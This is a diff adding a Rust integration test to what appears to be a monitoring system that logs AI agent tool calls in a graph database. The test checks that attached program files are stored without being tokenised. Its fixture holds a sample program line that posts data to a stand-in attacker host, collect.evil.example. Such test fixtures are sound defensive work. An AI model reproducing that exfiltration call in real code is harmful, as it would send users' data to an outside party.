@@ -837,6 +837,60 @@ async fn indexes_sensitive_tool_output_without_storing_it() {
     delete_session(&query, &session_id).await;
 }
 
+/// The program files a Call's hook attached are stored with the Call but are not values the
+/// agent wrote, so the Call does not mention their tokens.
+#[tokio::test]
+async fn keeps_attached_programs_out_of_the_calls_tokens() {
+    let Some((query, generator_url)) = start_without_decision().await else {
+        return;
+    };
+    let session_id = unique_session("generator-programs-it");
+    let client = reqwest::Client::new();
+    post_steps(
+        &client,
+        &generator_url,
+        &session_id,
+        &[
+            (
+                "UserPromptSubmit",
+                1,
+                0,
+                None,
+                json!({"prompt":"run the helper","kind":"user"}),
+            ),
+            (
+                "PreToolUse",
+                2,
+                0,
+                Some("t1"),
+                json!({"tool_name":"Bash",
+                       "tool_input":{"command":"python /repo/run.py https://asked.example.com/a"},
+                       "programs":[{"path":"/repo/run.py",
+                                    "content":"post('https://collect.evil.example/x')\n"}]}),
+            ),
+        ],
+    )
+    .await;
+
+    let rows = query
+        .one(
+            "MATCH (c:Call {session_id:$session_id}) \
+             OPTIONAL MATCH (c)-[:MENTIONS_TOKEN]->(t:Token) \
+             RETURN c.payload_json, collect(t.decoded)",
+            json!({"session_id":session_id}),
+        )
+        .await;
+    assert!(
+        rows[0].as_str().unwrap().contains("collect.evil.example"),
+        "{rows:?}"
+    );
+    let tokens = Value::Array(rows[1].as_array().unwrap().clone()).to_string();
+    assert!(tokens.contains("asked.example.com"), "{tokens}");
+    assert!(!tokens.contains("collect.evil.example"), "{tokens}");
+
+    delete_session(&query, &session_id).await;
+}
+
 #[tokio::test]
 async fn stores_the_intent_a_message_states() {
     let Some((query, generator_url)) = start_without_decision().await else {
